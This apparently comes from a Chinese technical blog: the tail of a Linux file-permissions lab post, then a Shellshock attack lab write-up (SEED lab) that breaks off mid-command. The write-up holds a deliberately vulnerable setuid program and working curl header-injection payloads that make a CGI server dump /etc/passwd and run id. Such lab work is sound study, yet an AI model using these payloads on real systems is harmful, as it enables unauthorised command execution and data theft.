src="/posts/e11b459a/image-20211029121727712.png" alt="image-20211029121727712"></p></li></ul></li></ul><h2 id="å®éªŒ3-æƒé™"><a class="markdownIt-Anchor" href="#å®éªŒ3-æƒé™"></a> å®éªŒ3 æƒé™</h2><h3 id="ä¸€-å®éªŒç›®çš„-3"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒç›®çš„-3"></a> ä¸€ã€å®éªŒç›®çš„</h3><p>ç»™å­¦ç”Ÿä¸€ä¸ªæ“ä½œæ–‡ä»¶ä¸ç›®å½•æƒé™çš„æœºä¼šã€‚ä½œå®Œè¿™äº›ç»ƒä¹ ä¹‹åï¼Œä½¿å­¦ç”Ÿèƒ½å¤Ÿå¯¹LINUXä¸­æ–‡ä»¶æ‰€æœ‰è€…çš„æ¦‚å¿µå’Œæƒé™çš„æ¦‚å¿µæœ‰åŸºæœ¬çš„ç†è§£ã€‚</p><h3 id="äºŒ-å®éªŒè¦æ±‚-3"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒè¦æ±‚-3"></a> äºŒã€å®éªŒè¦æ±‚</h3><p>æœ¬æ¬¡å®éªŒè¦æ±‚å®Œæˆä¸‹åˆ—å†…å®¹ï¼š</p><ul><li>ä½¿ç”¨é•¿åˆ—è¡¨å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•çš„ä¿¡æ¯</li><li>èƒ½å¤Ÿè§£é‡Šæ–‡ä»¶ä¸ç›®å½•æƒé™ä¸­å„ä½çš„å«ä¹‰</li><li>èƒ½å¤Ÿå¯¹æ™®é€šæ–‡ä»¶ä¸ç›®å½•çš„æƒé™è¿›è¡Œæ“ä½œ</li><li>èƒ½å¤Ÿæ›´æ”¹æ–‡ä»¶å’Œç›®å½•æ‰€å±çš„ç”¨æˆ·å’Œ</li></ul><h3 id="ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†-3"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†-3"></a> ä¸‰ã€å®éªŒé¢„å¤‡çŸ¥è¯†</h3><p>åœ¨linuxç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶æˆ–è€…ä¸€ä¸ªç›®å½•å±äºä¸€ä¸ªç”¨æˆ·æˆ–ä¸€ä¸ªç»„ã€‚Linuxæƒé™é€šè¿‡å…è®¸æ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿå¯¹è±¡è®¾ç½®ä¸‰ç§ç‹¬ç«‹çš„æƒé™çº§åˆ«æ¥å·¥ä½œã€‚3ç§ç‹¬ç«‹çš„æƒé™çº§åˆ«ä¸ºï¼š</p><ul><li>æ–‡ä»¶æ‹¥æœ‰è€…(u)ï¼›</li><li>æ–‡ä»¶æ‹¥æœ‰è€…æ‰€åœ¨ç”¨æˆ·ç»„ä¸­çš„å…¶å®ƒæˆå‘˜(g)ï¼›</li><li>æ‰€æœ‰å…¶å®ƒç”¨æˆ·(o)ã€‚</li></ul><p>æ¯ä¸ªæ–‡ä»¶å‡æ‹¥æœ‰ä¸‹åˆ—ä¸‰ç§æƒé™ï¼š</p><ul><li>read Â®: æŸ¥çœ‹æ–‡ä»¶å†…å®¹</li><li>write (w): ä¿®æ”¹æ–‡ä»¶</li><li>execute (x): å¦‚åŒå‘½ä»¤ä¸€æ ·æ‰§è¡Œæ–‡ä»¶</li></ul><p>æ¯ä¸ªç›®å½•å‡æ‹¥æœ‰ä¸‹åˆ—ä¸‰ç§æƒé™ï¼š</p><ul><li>read Â®: åˆ—å‡ºç›®å½•å†…å®¹</li><li>write (w): åœ¨ç›®å½•ä¸­å¢åˆ æ–‡ä»¶</li><li>execute (x): è®¿é—®ç›®å½•ä¸­çš„æ–‡ä»¶</li></ul><p>å½“ä½ åˆ›å»ºä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œç³»ç»Ÿä¿å­˜äº†æœ‰å…³è¯¥æ–‡ä»¶çš„å…¨éƒ¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>æ–‡ä»¶çš„ä½ç½®ã€‚</li><li>æ–‡ä»¶ç±»å‹ã€‚</li><li>æ–‡ä»¶é•¿åº¦ã€‚</li><li>å“ªä½ç”¨æˆ·æ‹¥æœ‰è¯¥æ–‡ä»¶ï¼Œå“ªäº›ç”¨æˆ·å¯ä»¥è®¿é—®è¯¥æ–‡ä»¶ã€‚</li><li>ièŠ‚ç‚¹ã€‚</li><li>æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ã€‚</li><li>æ–‡ä»¶çš„æƒé™ä½ã€‚</li></ul><p>åœ¨è¿›è¡Œå„ç§æ“ä½œæ—¶ï¼Œé¦–å…ˆå¿…é¡»å¼„æ¸…æ¥šè‡ªå·±æ‰€åœ¨çš„ç›®å½•ã€‚å¦‚æœä½ å¯¹è‡ªå·±ç›®å‰çš„ä½ç½®å¤±å»äº†æ„Ÿè§‰ï¼Œé‚£ä¹ˆå„ç§å‘½ä»¤å¯èƒ½éƒ½ä¼šå¤±æ•ˆã€‚æœ€æœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯ï¼Œç»å¸¸ä½¿ç”¨pwdå‘½ä»¤ï¼Œæ¥æŸ¥çœ‹ä½ æ‰€åœ¨çš„å½“å‰ç›®å½•ã€‚</p><h3 id="å››-å®éªŒå†…å®¹-3"><a class="markdownIt-Anchor" href="#å››-å®éªŒå†…å®¹-3"></a> å››ã€å®éªŒå†…å®¹</h3><h4 id="1-ä½¿ç”¨é•¿åˆ—è¡¨å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•çš„ä¿¡æ¯"><a class="markdownIt-Anchor" href="#1-ä½¿ç”¨é•¿åˆ—è¡¨å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•çš„ä¿¡æ¯"></a> 1. ä½¿ç”¨é•¿åˆ—è¡¨å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•çš„ä¿¡æ¯</h4><p>å¯¹ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨ls â€“l å‘½ä»¤ï¼Œå°±ä¼šæŒ‰å¦‚ä¸‹é¡ºåºæ˜¾ç¤ºä¸‹åˆ—ä¿¡æ¯ï¼š</p><ul><li><p>æ–‡ä»¶ç±»å‹ï¼ˆç¬¬1ä¸ªå­—ç¬¦ï¼‰</p><ul><li>-: æ™®é€šæ–‡ä»¶</li><li>d: ç›®å½•</li><li>l: ç¬¦å·é“¾æ¥</li><li>c: å­—ç¬¦å‹è®¾å¤‡èŠ‚ç‚¹</li><li>b: å—è®¾å¤‡èŠ‚ç‚¹</li></ul></li><li><p>æ–‡ä»¶è®¿é—®æƒé™ï¼ˆæ¥ä¸‹æ¥çš„9ä¸ªå­—ç¬¦ï¼Œæ¯3ä¸ªä¸€ç»„ä¾æ¬¡ä»£è¡¨userã€groupå’Œotherï¼‰</p></li><li><p>æ–‡ä»¶çš„ç¡¬é“¾æ¥æ•°</p></li><li><p>æ–‡ä»¶æ‹¥æœ‰userçš„ç”¨æˆ·å</p></li><li><p>æ–‡ä»¶æ‰€å±groupçš„ç”¨æˆ·ç»„å</p></li><li><p>æ–‡ä»¶çš„å­—ç¬¦æ•°size (bytes)</p></li><li><p>æ–‡ä»¶çš„date and time (mtime)</p></li><li><p>æ–‡ä»¶çš„name</p></li></ul><p><img src="/posts/e11b459a/image-20211029162532418.png" alt="image-20211029162532418"></p><h4 id="2-è§£é‡Šæ–‡ä»¶ä¸ç›®å½•æƒé™ä¸­å„ä½çš„å«ä¹‰"><a class="markdownIt-Anchor" href="#2-è§£é‡Šæ–‡ä»¶ä¸ç›®å½•æƒé™ä¸­å„ä½çš„å«ä¹‰"></a> 2. è§£é‡Šæ–‡ä»¶ä¸ç›®å½•æƒé™ä¸­å„ä½çš„å«ä¹‰</h4><p>å¯¹äºæ–‡ä»¶a.out</p><p>ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º-ï¼Œè¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥9ä¸ªå­—ç¬¦æ¯ä¸‰ä½åˆ†åˆ«ä»£è¡¨æ‰€æœ‰è€…æƒé™ã€åŒç»„ç”¨æˆ·æƒé™å’Œå…¶ä»–ç”¨æˆ·æƒé™ï¼Œåœ¨ä¸Šä¾‹ä¸­ï¼Œä¹ä¸ªå­—ç¬¦åˆ†åˆ«ä¸ºï¼šrwxã€rwxã€r-xï¼Œå› æ­¤a.outæ–‡ä»¶å…·æœ‰æ‰€æœ‰è€…ç±»ä¸­çš„è¯»å†™å’Œæ‰§è¡Œæƒé™ï¼Œå¯¹äºç»„ç±»ä¹Ÿæœ‰è¯»å†™å’Œæ‰§è¡Œæƒé™ï¼Œè€Œå¯¹äºå…¶ä»–ç”¨æˆ·ç±»ä¹Ÿåªæœ‰è¯»å’Œæ‰§è¡Œæƒé™ã€‚</p><p>åé¢çš„ä¿¡æ¯ä¾æ¬¡è¡¨ç¤ºa.outæ–‡ä»¶çš„ç¡¬é“¾æ¥æ•°ä¸º1ï¼Œæ–‡ä»¶æ‰€å±çš„ç”¨æˆ·åä¸ºzinoï¼Œæ–‡ä»¶æ‰€å±ç»„åä¸ºzinoï¼Œæ–‡ä»¶å¤§å°ä¸º16696byteï¼Œæœ€åæ˜¯æ–‡ä»¶åˆ›å»ºçš„æ—¶é—´ä¸º6æœˆ21æ—¥19:22å’Œæ–‡ä»¶åä¸ºa.outã€‚</p><h4 id="3-å¯¹æ™®é€šæ–‡ä»¶ä¸ç›®å½•çš„æƒé™è¿›è¡Œæ“ä½œ"><a class="markdownIt-Anchor" href="#3-å¯¹æ™®é€šæ–‡ä»¶ä¸ç›®å½•çš„æƒé™è¿›è¡Œæ“ä½œ"></a> 3. å¯¹æ™®é€šæ–‡ä»¶ä¸ç›®å½•çš„æƒé™è¿›è¡Œæ“ä½œ</h4><p>æ”¹å˜æ–‡ä»¶æƒé™çš„å‘½ä»¤æ˜¯chmod</p><ul><li><p>chmodå‘½ä»¤çš„ä¸€èˆ¬æ ¼å¼ä¸º:  chmod [who] operator [permission] filename</p></li><li><p>who çš„å«ä¹‰æ˜¯ï¼š</p><ul><li>u æ–‡ä»¶å±ä¸»æƒé™ã€‚</li><li>g åŒç»„ç”¨æˆ·æƒé™ã€‚</li><li>o å…¶ä»–ç”¨æˆ·æƒé™ã€‚</li><li>a æ‰€æœ‰ç”¨æˆ·(æ‰€æœ‰è€…ã€åŒç»„ç”¨æˆ·åŠå…¶ä»–ç”¨æˆ·)ã€‚</li></ul></li><li><p>operatorçš„å«ä¹‰ï¼š</p><ul><li>+  å¢åŠ æƒé™ã€‚</li><li>-   å–æ¶ˆæƒé™ã€‚</li><li>=  è®¾å®šæƒé™ã€‚</li></ul></li><li><p>permissionçš„å«ä¹‰ï¼š</p><ul><li>r è¯»æƒé™ã€‚</li><li>w å†™æƒé™ã€‚</li><li>x æ‰§è¡Œæƒé™ã€‚</li><li>s æ–‡ä»¶å±ä¸»å’Œç»„set-IDã€‚</li><li>t ç²˜æ€§ä½*ã€‚</li><li>l ç»™æ–‡ä»¶åŠ é”ï¼Œä½¿å…¶ä»–ç”¨æˆ·æ— æ³•è®¿é—®ã€‚</li></ul></li><li><p>ä¸¾ä¾‹ï¼š<br>$chmod a-x  a.out  æ”¶å›æ‰€æœ‰ç”¨æˆ·çš„æ‰§è¡Œæƒé™</p><p><img src="/posts/e11b459a/image-20211029165852610.png" alt="image-20211029165852610"></p><p>$chmod u+x myfile  èµ‹äºˆæ–‡ä»¶å±ä¸»æ‰§è¡Œ</p><p><img src="/posts/e11b459a/image-20211029165929699.png" alt="image-20211029165929699"></p></li></ul><p>ä¸Šé¢æ‰€è¿°çš„æ”¹å˜ç”¨æˆ·æƒé™çš„æ–¹æ³•è¢«ç§°ä¸ºæƒé™ç¬¦å·æ³•ï¼Œè¿˜æœ‰ä¸€ç§æ›´ä¸ºç®€ä¾¿çš„æ–¹æ³•ç”¨æ¥æ›´æ”¹ç”¨æˆ·æƒé™ï¼š<strong>äºŒè¿›åˆ¶æ©ç æ³•</strong>(ç»å¯¹æ–¹æ³•)ã€‚</p><ul><li><p>å«ä¹‰</p><p>ç»å¯¹æ–¹æ³•å°±æ˜¯ä½¿ç”¨å…«è¿›åˆ¶æ•°å­—ä½œä¸ºæ©ç æ¥è®¾ç½®ä¸åŒçš„æ–‡ä»¶æƒé™ã€‚æ¯ä¸ªå…«è¿›åˆ¶æ•°å­—åº”ç”¨äºä¸€ç§ç”¨æˆ·ç±»ã€‚ä½ å¯ä»¥å°†è¿™ä¸ªæ•°å­—æƒ³è±¡ä¸ºä»æ‰€æœ‰è€…ç±»å¼€å§‹ä»å·¦åˆ°å³ä¸æƒé™ç±»åˆ«ç›¸åŒ¹é…ã€‚</p><p><strong>ç¬¬ä¸€ä¸ªå…«è¿›åˆ¶æ•°å­—åº”ç”¨äºæ‰€æœ‰è€…ç±»ï¼Œç¬¬äºŒä¸ªæ˜¯åŒç»„ç±»ï¼Œè€Œç¬¬ä¸‰ä¸ªæ˜¯å…¶ä»–ç”¨æˆ·ç±»</strong>ã€‚</p><p>ä½ æ‰€é€‰æ‹©çš„å®é™…çš„å…«è¿›åˆ¶æ•°å­—å¯ä»¥ä¸ºæ¯ä¸ªç”¨æˆ·ç±»ç¡®å®šè¯»ã€å†™å’Œæ‰§è¡Œæƒé™ã€‚ä»è¿™ä¸€ç‚¹ä¸Šè¯´ï¼Œéœ€è¦äº†è§£å…«è¿›åˆ¶æ•°å­—æ˜¯å¦‚ä½•è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼çš„ã€‚<br>å¯ä»¥è®¤ä¸ºé¦–å…ˆå°†å…«è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼ï¼Œç„¶åæ¯ä¸ªä¸‰ä½äºŒè¿›åˆ¶æ•°å­—ç”¨äºè®¾ç½®è¯»ã€å†™å’Œæ‰§è¡Œæƒé™ã€‚æ¯ä¸ªäºŒè¿›åˆ¶æ•°å­—ä»å·¦åˆ°å³å’Œç›¸åº”çš„æƒé™ç›¸åŒ¹é…ã€‚å¦‚æœä¸€ä¸ªäºŒè¿›åˆ¶æ•°å­—æ˜¯0ï¼Œé‚£ä¹ˆè¯¥æƒé™åˆ™è¢«ç¦æ­¢ï¼Œå¦‚æœæ˜¯1åˆ™è¢«æ‰“å¼€ã€‚ç¬¬ä¸€ä¸ªäºŒè¿›åˆ¶ä½è®¾ç½®äº†è¯»æƒé™çš„æ‰“å¼€ä¸å…³é—­ï¼Œç¬¬äºŒä¸ªè®¾ç½®äº†å†™æƒé™ï¼Œç¬¬ä¸‰ä¸ªè®¾ç½®äº†æ‰§è¡Œæƒé™ã€‚<br>ä¾‹å¦‚ï¼Œä¸€ä¸ªå…«è¿›åˆ¶æ•°å­—6è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°å­—110ã€‚è¿™ä¼šå°†è¯»å†™æƒé™æ‰“å¼€ï¼Œæ‰§è¡Œæƒé™å…³é—­</p><p>ç”±å…«è¿›åˆ¶åˆ°äºŒè¿›åˆ¶çš„è½¬æ¢å¾ˆéº»çƒ¦ï¼Œè¿™é‡Œæœ‰ä¸ªç®€ä¾¿æ–¹æ³•ï¼šå¦‚æœèµ‹äºˆè¯»æƒé™ï¼Œç®—4ï¼›å¦‚æœèµ‹äºˆå†™æƒé™ï¼Œç®—2ï¼›å¦‚æœèµ‹äºˆæ‰§è¡Œæƒï¼Œç®—1ï¼›å°†è¿™äº›æ•°å­—ç´¯åŠ èµ·æ¥ï¼Œå¦‚æœåŒæ—¶æ‹¥æœ‰è¯»å–å’Œå†™æƒé™ï¼Œ<br>é‚£å°±æ˜¯2+4=6ï¼Œä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶é‡Œé¢çš„110ã€‚</p></li><li><p>ä¸¾ä¾‹ï¼š</p><p>$chmod 666 myfile ï¼š<br>èµ‹äºˆæ‰€æœ‰ç”¨æˆ·è¯»å’Œå†™çš„æƒé™(è¯»+å†™=2+4=6)</p><p><img src="/posts/e11b459a/image-20211029170150062.png" alt="image-20211029170150062"></p><p>$chmod 744 myfile ï¼š<br>èµ‹äºˆæ–‡ä»¶æ‰€æœ‰è€…è¯»ã€å†™å’Œæ‰§è¡Œçš„æƒé™(è¯»+å†™+æ‰§è¡Œ=1+2+4=7)ï¼Œæ‰€æœ‰å…¶ä»–ç”¨æˆ·è¯»çš„æƒé™(è¯»ï¼4)ã€‚</p><p><img src="/posts/e11b459a/image-20211029170209608.png" alt="image-20211029170209608"></p></li></ul><h4 id="4-æ›´æ”¹æ–‡ä»¶å’Œç›®å½•æ‰€å±çš„ç”¨æˆ·å’Œç»„"><a class="markdownIt-Anchor" href="#4-æ›´æ”¹æ–‡ä»¶å’Œç›®å½•æ‰€å±çš„ç”¨æˆ·å’Œç»„"></a> 4. æ›´æ”¹æ–‡ä»¶å’Œç›®å½•æ‰€å±çš„ç”¨æˆ·å’Œç»„</h4><p>æ”¹å˜æ–‡ä»¶æ‰€æœ‰è€…çš„å‘½ä»¤æ˜¯chown</p><ul><li><p>chownå‘½ä»¤çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šchown -R -h owner file</p></li><li><p>-Ré€‰é¡¹æ„å‘³ç€å¯¹æ‰€æœ‰å­ç›®å½•ä¸‹çš„æ–‡ä»¶ä¹Ÿéƒ½è¿›è¡ŒåŒæ ·çš„æ“ä½œã€‚</p></li><li><p>-hé€‰é¡¹æ„å‘³ç€åœ¨æ”¹å˜ç¬¦å·é“¾æ¥æ–‡ä»¶çš„å±ä¸»æ—¶ä¸å½±å“è¯¥é“¾æ¥æ‰€æŒ‡å‘çš„ç›®æ ‡æ–‡ä»¶ã€‚</p></li><li><p>ä¸¾ä¾‹</p><p>åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼š$ls â€“l a.out<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„æ‹¥æœ‰è€…æ˜¯zinoã€‚<br>æ¥ç€è¿è¡Œï¼š$ chown root a.out<br>è¿è¡Œå®Œæˆåæˆ‘ä»¬ç»§ç»­è¿è¡Œï¼š$ ls â€“l a.out<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„æ‹¥æœ‰è€…æ˜¯rootã€‚</p><p><img src="/posts/e11b459a/image-20211029171209781.png" alt="image-20211029171209781"></p></li></ul><p>æ”¹å˜æ–‡ä»¶æ‰€æœ‰ç»„çš„å‘½ä»¤ä¸ºchgrp</p><ul><li><p>chgrpå‘½ä»¤çš„ä½¿ç”¨æ–¹å¼ä¸chownåŸºæœ¬ç›¸åŒï¼šchgrp â€“R â€“h group file</p></li><li><p>-Ré€‰é¡¹æ„å‘³ç€å¯¹æ‰€æœ‰å­ç›®å½•ä¸‹çš„æ–‡ä»¶ä¹Ÿéƒ½è¿›è¡ŒåŒæ ·çš„æ“ä½œã€‚</p></li><li><p>-hé€‰é¡¹æ„å‘³ç€åœ¨æ”¹å˜ç¬¦å·é“¾æ¥æ–‡ä»¶çš„æ‰€å±ç»„æ—¶ä¸å½±å“è¯¥é“¾æ¥æ‰€æŒ‡å‘çš„ç›®æ ‡æ–‡ä»¶ã€‚</p></li><li><p>ä¸¾ä¾‹ï¼šåœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼š$ ls â€“l a.out<br>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ–‡ä»¶æ‰€å±çš„ç”¨æˆ·ç»„ä¸ºzinoã€‚<br>æ¥ç€è¿è¡Œï¼š$ chgrp root a.out<br>ç„¶åç»§ç»­è¿è¡Œï¼š$ ls â€“l a.out<br>å¯ä»¥çœ‹å‡ºæ–‡ä»¶çš„æ‰€å±çš„ç»„ä¸ºrootã€‚</p><p><img src="/posts/e11b459a/image-20211029171327096.png" alt="image-20211029171327096"></p></li><li><p>æç¤ºï¼š</p><ul><li><p>å¦‚æœä½ æƒ³çŸ¥é“è‡ªå·±å±äºå“ªå‡ ä¸ªç”¨æˆ·ç»„ï¼Œå¯ä»¥ä½¿ç”¨group<br>å’Œidå‘½ä»¤ï¼š<br>$ group æˆ–<br>$ id</p><p><img src="/posts/e11b459a/image-20211029172200328.png" alt="image-20211029172200328"></p></li><li><p>å¦‚æœæƒ³è¦çŸ¥é“å…¶å®ƒç”¨æˆ·å±äºå“ªå‡ ä¸ªç”¨æˆ·ç»„ï¼Œå°±åœ¨group<br>å‘½ä»¤åé¢æ¥ä¸Šç”¨æˆ·åï¼Œå¦‚ï¼š<br>$ group aifi<br>â€‹$ users admin general<br>ä¸Šé¢çš„å‘½ä»¤å‘Šè¯‰æˆ‘ä»¬ï¼Œaifiå±äºusersã€adminå’Œgeneralè¿™ä¸‰ä¸ªç”¨æˆ·ç»„ã€‚</p></li><li><p>cat /etc/group  æŸ¥çœ‹åˆ†ç»„</p><p><img src="/posts/e11b459a/image-20211029172141101.png" alt="image-20211029172141101"></p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellshock Attack lab</title>
    <link href="/posts/35f73974/"/>
    <url>/posts/35f73974/</url>
    
    <content type="html"><![CDATA[<h1 id="shellshock_attack_lab"><a class="markdownIt-Anchor" href="#shellshock_attack_lab"></a> Shellshock_Attack_lab</h1><h2 id="task-1"><a class="markdownIt-Anchor" href="#task-1"></a> task 1</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//vul.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>setuid(geteuid());<br>system(<span class="hljs-string">&quot;/bin/ls -l&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>é¦–å…ˆå‡†å¤‡æœ‰æ¼æ´çš„ç¨‹åºvul.c</p><p>ç„¶åæˆ‘ä»¬ç¼–è¯‘è¿è¡Œï¼Œå¹¶å°†å…¶å˜æˆä¸€ä¸ªset-UIDç¨‹åº</p><p>å› ä¸ºUbuntu20.04ä¸­/bin/shæŒ‡å‘/bin/dashï¼Œè€Œè¿™ä¸ªç¨‹åºæ²¡æœ‰shellshockæ¼æ´ï¼Œæ‰€ä»¥éœ€è¦æ›´æ”¹ç¬¦å·é“¾æ¥ï¼Œé‡‡ç”¨å‘½ä»¤</p><p><code>sudo ln -sf /bin/bash_shellshock /bin/sh</code></p><p>åŒæ—¶æˆ‘ä»¬å‘ç°20.04ä¸­/binæ–‡ä»¶å¤¹ä¸‹æ²¡æœ‰bash_shellshockæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦sudo suè¿›å…¥rootåè‡ªå·±cpä¸€ä¸‹ã€‚</p><p>æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªshellå˜é‡fooå¹¶è¾“å‡ºå®ƒï¼Œè¿™æ ·å½“è¿è¡Œset-UIDç¨‹åºï¼ˆvul)æ—¶ï¼Œshellå˜é‡ä¼šå˜æˆå­è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚ç”±äºsystemå‡½æ•°çš„åŸå› ï¼ŒBashä¼šè¢«è°ƒç”¨ï¼Œå®ƒç›‘æµ‹åˆ°ç¯å¢ƒå˜é‡fooä¸­å­˜æ”¾äº†ä¸€ä¸ªç¯å¢ƒå£°æ˜ï¼Œå› æ­¤ä¼šè§£æè¯¥å£°æ˜ï¼Œç”±äºé€»è¾‘è§£æçš„æ¼æ´ï¼Œå®ƒæœ€ç»ˆä¼šæ‰§è¡Œæ”¾åœ¨æœ«å°¾çš„/bin/shæŒ‡ä»¤ï¼Œæ‰€ä»¥æˆ‘ä¹‹åä¼šæˆåŠŸè¿›å…¥ä¸€ä¸ªå…·æœ‰rootæƒé™çš„shellç¨‹åºã€‚</p><p><img src="/posts/35f73974/image-20211027172958405.png" alt="image-20211027172958405"></p><p><img src="/posts/35f73974/image-20211027173023492.png" alt="image-20211027173023492"></p><p>å°†é“¾æ¥æ”¹å›å»åå†æ¬¡æ‰§è¡Œvul,æˆ‘ä»¬å‘ç°ç¨‹åºæ­£å¸¸ï¼Œæ²¡æœ‰è¢«æ”»å‡»ã€‚</p><p><img src="/posts/35f73974/image-20211027174008884.png" alt="image-20211027174008884"></p><h2 id="task-2"><a class="markdownIt-Anchor" href="#task-2"></a> task 2</h2><h3 id="task-2a-using-brower"><a class="markdownIt-Anchor" href="#task-2a-using-brower"></a> task 2.A: Using brower</h3><p><img src="/posts/35f73974/image-20211027180800482.png" alt="image-20211027180800482"></p><p><img src="/posts/35f73974/image-20211027180830505.png" alt="image-20211027180830505"></p><p>ApacheæœåŠ¡å™¨ä¼šä»httpè¯·æ±‚å¤´ä¸­è·å–ä¿¡æ¯ï¼Œèµ‹å€¼ç»™CGIç¨‹åºçš„ç¯å¢ƒå˜é‡ã€‚</p><h3 id="task-2b-using-curl"><a class="markdownIt-Anchor" href="#task-2b-using-curl"></a> task 2.B Using curl</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>-v  æ‰“å°å‡ºhttpè¯·æ±‚å¤´</p><p><img src="/posts/35f73974/image-20211028162819689.png" alt="image-20211028162819689"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>-A  è®¾ç½®User-Agent</p><p><img src="/posts/35f73974/image-20211028162913084.png" alt="image-20211028162913084"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>-e è®¾ç½®Refererå­—æ®µ</p><p><img src="/posts/35f73974/image-20211028163009475.png" alt="image-20211028163009475"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>-H è®¾ç½®é¢å¤–å¤´å­—æ®µ</p><p><img src="/posts/35f73974/image-20211028163108646.png" alt="image-20211028163108646"></p><h2 id="task-3"><a class="markdownIt-Anchor" href="#task-3"></a> task 3</h2><h3 id="task-3a"><a class="markdownIt-Anchor" href="#task-3a"></a> Task 3.A:</h3><ul><li><strong>Get the server to send back the content of the /etc/passwd file.</strong></li></ul><p>åˆ©ç”¨äº†-Aä¿®æ”¹User-Agentå­—æ®µ</p><p>æ‰§è¡Œå‘½ä»¤</p><p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028165749466.png" alt="image-20211028165749466"></p><h3 id="task-3b"><a class="markdownIt-Anchor" href="#task-3b"></a> Task 3.B:</h3><p><strong>Get the server to tell you its processâ€™ user ID. Y ou can use the /bin/id command to print out the ID information.</strong></p><p>åˆ©ç”¨-eä¿®æ”¹Refererå­—æ®µæ¥è·å–ID</p><p>æ‰§è¡Œå‘½ä»¤</p><p><code>curl -e &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/id&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028170325981.png" alt="image-20211028170325981"></p><h3 id="task-3c"><a class="markdownIt-Anchor" href="#task-3c"></a> Task 3.C:</h3><p><strong>Get the server to create a file inside the /tmp folder. Y ou need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder.</strong></p><p><img src="/posts/35f73974/image-20211028172005730.png" alt="image-20211028172005730"></p><p>åˆ©ç”¨-Håˆ›å»ºé¢å¤–å¤´å­—æ®µ</p><p>æŸ¥çœ‹tmp</p><p><code>curl -H &quot;test: () 